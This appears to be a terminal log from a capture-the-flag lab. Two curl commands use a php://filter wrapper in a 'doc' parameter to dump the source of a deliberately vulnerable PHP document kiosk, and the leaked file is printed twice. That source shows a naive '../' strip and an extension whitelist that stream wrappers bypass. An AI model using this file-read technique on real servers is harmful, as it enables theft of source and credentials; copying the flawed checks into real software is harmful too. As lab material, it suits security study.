curl -s "http://10.48.153.61/?doc=php://filter/resource=index.php"
<?php
$doc = isset($_GET['doc']) ? $_GET['doc'] : '';

$decoys = ['village_schedule.pdf', 'important.png'];

// If a doc param was sent, serve it (this is the vulnerable path)
if ($doc !== '') {

    // stage 1: naive single-pass traversal strip
    $doc = str_replace('../', '', $doc);

    $base = __DIR__ . '/village_docs/';
    $is_wrapper = (strpos($doc, '://') !== false);

    if (!$is_wrapper) {
        // stage 2: extension whitelist, only ever applied to plain filenames
        if (stripos($doc, '.pdf') === false && stripos($doc, '.png') === false) {
            http_response_code(403);
            die('Only .pdf and .png village documents may be viewed.');
        }
        $path = (isset($doc[0]) && $doc[0] === '/') ? $doc : $base . $doc;
    } else {
        // wrapper protocols were never covered by the whitelist check above
        $path = $doc;
    }

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: inline; filename="' . basename($doc) . '"');
    readfile($path);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>VILLAGE ARCHIVE TERMINAL v2.3</title>
<style>
    body {
        background-color: #060a0a;
        background-image:
            linear-gradient(rgba(45, 212, 191, 0.06) 1px, transparent 1px),
            linear-gradient(90deg, rgba(45, 212, 191, 0.06) 1px, transparent 1px);
        background-size: 28px 28px;
        color: #2dd4bf;
        font-family: 'Courier New', monospace;
        margin: 0;
        padding: 40px;
        min-height: 100vh;
    }
    .terminal {
        max-width: 720px;
        margin: 0 auto;
        background: rgba(6, 10, 10, 0.85);
        border: 1px solid #2dd4bf;
        border-radius: 2px;
        padding: 24px;
        box-shadow: 0 0 24px rgba(45, 212, 191, 0.12);
    }
    h1 {
        font-size: 20px;
        letter-spacing: 3px;
        text-transform: uppercase;
        border-bottom: 1px dotted #2dd4bf;
        padding-bottom: 10px;
        margin: 0 0 4px;
    }
    .tagline {
        font-size: 11px;
        letter-spacing: 2px;
        color: #0f766e;
        text-transform: uppercase;
        margin: 0 0 20px;
    }
    .prompt {
        color: #5eead4;
        margin-top: 20px;
        letter-spacing: 1px;
        font-size: 13px;
    }
    ul {
        list-style: none;
        padding: 0;
    }
    li {
        margin: 8px 0;
    }
    a {
        color: #2dd4bf;
        text-decoration: none;
        border: 1px dotted #115e59;
        padding: 6px 12px;
        display: inline-block;
        width: 260px;
        transition: background 0.15s, color 0.15s;
    }
    a:hover {
        background: #2dd4bf;
        color: #060a0a;
        border-color: #2dd4bf;
    }
    .footer {
        margin-top: 30px;
        font-size: 12px;
        color: #0f766e;
        border-top: 1px dotted #115e59;
        padding-top: 10px;
    }
    code {
        color: #5eead4;
    }
</style>
</head>
<body>
<div class="terminal">
    <h1>&gt; Secret Village Archive Terminal</h1>
    <p class="tagline">village kiosk // read-only access</p>
    <p>Welcome, attendee. This kiosk serves talk decks and vendor flyers for the village.</p>

    <div class="prompt">AVAILABLE DOCUMENTS:</div>
    <ul>
        <?php foreach ($decoys as $d): ?>
        <li><a href="?doc=<?php echo urlencode($d); ?>"><?php echo htmlspecialchars($d); ?></a></li>
        <?php endforeach; ?>
    </ul>

    <div class="footer">
        Request format: <code>?doc=&lt;filename&gt;</code><br>
        Only .pdf and .png documents are served from this terminal.
    </div>
</div>
</body>
</html>






---







curl -s "http://10.48.153.61/?doc=php://filter/convert.base64-encode/resource=index.php" | base64 -d
<?php
$doc = isset($_GET['doc']) ? $_GET['doc'] : '';

$decoys = ['village_schedule.pdf', 'important.png'];

// If a doc param was sent, serve it (this is the vulnerable path)
if ($doc !== '') {

    // stage 1: naive single-pass traversal strip
    $doc = str_replace('../', '', $doc);

    $base = __DIR__ . '/village_docs/';
    $is_wrapper = (strpos($doc, '://') !== false);

    if (!$is_wrapper) {
        // stage 2: extension whitelist, only ever applied to plain filenames
        if (stripos($doc, '.pdf') === false && stripos($doc, '.png') === false) {
            http_response_code(403);
            die('Only .pdf and .png village documents may be viewed.');
        }
        $path = (isset($doc[0]) && $doc[0] === '/') ? $doc : $base . $doc;
    } else {
        // wrapper protocols were never covered by the whitelist check above
        $path = $doc;
    }

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: inline; filename="' . basename($doc) . '"');
    readfile($path);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>VILLAGE ARCHIVE TERMINAL v2.3</title>
<style>
    body {
        background-color: #060a0a;
        background-image:
            linear-gradient(rgba(45, 212, 191, 0.06) 1px, transparent 1px),
            linear-gradient(90deg, rgba(45, 212, 191, 0.06) 1px, transparent 1px);
        background-size: 28px 28px;
        color: #2dd4bf;
        font-family: 'Courier New', monospace;
        margin: 0;
        padding: 40px;
        min-height: 100vh;
    }
    .terminal {
        max-width: 720px;
        margin: 0 auto;
        background: rgba(6, 10, 10, 0.85);
        border: 1px solid #2dd4bf;
        border-radius: 2px;
        padding: 24px;
        box-shadow: 0 0 24px rgba(45, 212, 191, 0.12);
    }
    h1 {
        font-size: 20px;
        letter-spacing: 3px;
        text-transform: uppercase;
        border-bottom: 1px dotted #2dd4bf;
        padding-bottom: 10px;
        margin: 0 0 4px;
    }
    .tagline {
        font-size: 11px;
        letter-spacing: 2px;
        color: #0f766e;
        text-transform: uppercase;
        margin: 0 0 20px;
    }
    .prompt {
        color: #5eead4;
        margin-top: 20px;
        letter-spacing: 1px;
        font-size: 13px;
    }
    ul {
        list-style: none;
        padding: 0;
    }
    li {
        margin: 8px 0;
    }
    a {
        color: #2dd4bf;
        text-decoration: none;
        border: 1px dotted #115e59;
        padding: 6px 12px;
        display: inline-block;
        width: 260px;
        transition: background 0.15s, color 0.15s;
    }
    a:hover {
        background: #2dd4bf;
        color: #060a0a;
        border-color: #2dd4bf;
    }
    .footer {
        margin-top: 30px;
        font-size: 12px;
        color: #0f766e;
        border-top: 1px dotted #115e59;
        padding-top: 10px;
    }
    code {
        color: #5eead4;
    }
</style>
</head>
<body>
<div class="terminal">
    <h1>&gt; Secret Village Archive Terminal</h1>
    <p class="tagline">village kiosk // read-only access</p>
    <p>Welcome, attendee. This kiosk serves talk decks and vendor flyers for the village.</p>

    <div class="prompt">AVAILABLE DOCUMENTS:</div>
    <ul>
        <?php foreach ($decoys as $d): ?>
        <li><a href="?doc=<?php echo urlencode($d); ?>"><?php echo htmlspecialchars($d); ?></a></li>
        <?php endforeach; ?>
    </ul>

    <div class="footer">
        Request format: <code>?doc=&lt;filename&gt;</code><br>
        Only .pdf and .png documents are served from this terminal.
    </div>
</div>
</body>
</html>
